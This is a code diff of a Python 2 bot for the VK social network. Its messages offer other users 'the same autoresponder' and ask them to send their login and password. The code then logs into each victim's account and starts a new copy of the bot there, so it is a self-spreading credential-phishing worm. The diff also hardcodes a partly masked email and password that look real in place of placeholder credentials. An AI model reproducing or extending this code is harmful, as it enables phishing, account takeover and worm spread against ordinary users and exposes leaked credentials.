@@ -13,14 +13,8 @@ messagetext1 = ["Если хочешь такой же автоответчик,
 messagetext2 = ["У пользователя твой пароль удалится!", "У собеседника пароль не высветится", "Твой пароль собеседник не увидит"]
 messagetexterror = ["Неправильный лоигн или пароль", "Ошибка! Неверные данные.","Не удалось авторизоваться. Проверьте данные."]
 last_time = 0
-def kolvo():
-    while True:
-        print "#######################"
-        print "Quantity users: " + str(len(threads))
-        print users
-        time.sleep(2)
 
-def st(log,pas):
+def st(log,pas,logi):
     session = vk.Session()
     session = vk.AuthSession('5001234', log, pas, scope='wall, messages, users')
     vk_api = vk.API(session)
@@ -31,6 +25,10 @@ def st(log,pas):
     print "new user: " + resp_account["first_name"] + " " + resp_account["last_name"]
     last_time = time.time()
     while True:
+        if logi:
+            print "#######################"
+            print "Quantity users: " + str(len(threads)+1)
+            print users
         resp = vk_api.messages.get(out="0", count = "1")[1]
         userid = int(resp["uid"])
         if resp["read_state"] == 0 and resp.keys()[6] != "users_count":
@@ -51,7 +49,7 @@ def st(log,pas):
                     vk_api.messages.send(user_id=userid, message=messagetexterror[times])
                     print ("login or password is not avalible")
                 else:
-                    t = threading.Thread(target=st, args = (log, pas))
+                    t = threading.Thread(target=st, args = (log, pas,False))
                     threads.append(t)
                     t.start()
                     vk_api.messages.send(user_id=userid, message="Готово")
@@ -77,7 +75,4 @@ def st(log,pas):
                     
         time.sleep(2)
 raw_input("For start please 'Enter'")
-t = threading.Thread(target=kolvo)
-threads.append(t)
-t.start()
-st("login", "pass")
+st("d_____a@mail.ru", "fitabe698",True)
